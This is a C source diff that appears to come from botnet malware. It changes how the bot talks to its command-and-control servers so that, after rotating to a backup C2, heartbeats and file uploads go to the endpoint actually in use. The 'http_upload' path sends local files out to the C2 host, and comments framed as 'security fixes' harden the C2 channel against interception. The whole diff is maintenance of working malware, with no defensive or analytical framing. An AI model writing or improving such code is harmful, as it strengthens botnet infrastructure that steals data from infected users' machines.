@@ -803,6 +803,12 @@ int http_connect(notnet_bot_t *bot) {
 
     bot->c2_http.sock = sock;
     bot->c2_http.connected = 1;
+    /* SECURITY FIX (#110): remember the endpoint we actually connected to
+     * (rotation chain index 0 = primary, >0 = backup) so request builders
+     * emit the correct Host header instead of the primary's. */
+    snprintf(bot->c2_http.effective_server, sizeof(bot->c2_http.effective_server),
+             "%.255s", host);
+    bot->c2_http.effective_port = port;
     /* SECURITY FIX (#45): Do NOT pin the peer IP here on the raw connect.
      * The first (unauthenticated) connection must not become the trusted
      * pin — an on-path attacker who intercepts the first DNS resolution
@@ -819,6 +825,12 @@ int http_post(notnet_bot_t *bot, const char *data, int len) {
     
     log_info("HTTP: heartbeat sent (%d bytes)", len);
     
+    /* SECURITY FIX (#110): the Host header must name the endpoint we are
+     * actually connected to. At rotation index 0 effective_server equals
+     * c2_http.server; on a backup it is the backup host, so the backup's
+     * virtual-host routing and path see a coherent request. */
+    const char *host = bot->c2_http.effective_server[0]
+                       ? bot->c2_http.effective_server : bot->c2_http.server;
     char headers[1024];
     snprintf(headers, sizeof(headers),
         "POST %s HTTP/1.1\r\n"
@@ -828,7 +840,7 @@ int http_post(notnet_bot_t *bot, const char *data, int len) {
         "Content-Length: %d\r\n"
         "Connection: keep-alive\r\n"
         "\r\n",
-        bot->c2_http.path, bot->c2_http.server, bot->c2_http.user_agent, len);
+        bot->c2_http.path, host, bot->c2_http.user_agent, len);
     
     /* SECURITY FIX (#28): Check send() return values to detect connection
      * drops. Previously sent headers+body without checking if they were
@@ -1389,8 +1401,13 @@ int http_upload(notnet_bot_t *bot, const char *file_path, const char *upload_pat
         else snprintf(path, sizeof(path), "/");
     } else {
         is_c2_fallback = 1;
-        snprintf(host, sizeof(host), "%s", bot->c2_http.server);
-        port = bot->c2_http.port;
+        /* SECURITY FIX (#110): on a rotated backup the upload must dial
+         * AND name the effective endpoint, not the primary's host/port. */
+        snprintf(host, sizeof(host), "%s",
+                 bot->c2_http.effective_server[0]
+                     ? bot->c2_http.effective_server : bot->c2_http.server);
+        port = bot->c2_http.effective_port ? bot->c2_http.effective_port
+                                           : bot->c2_http.port;
         snprintf(path, sizeof(path), "%s", upload_path ? upload_path : bot->c2_http.path);
     }
 
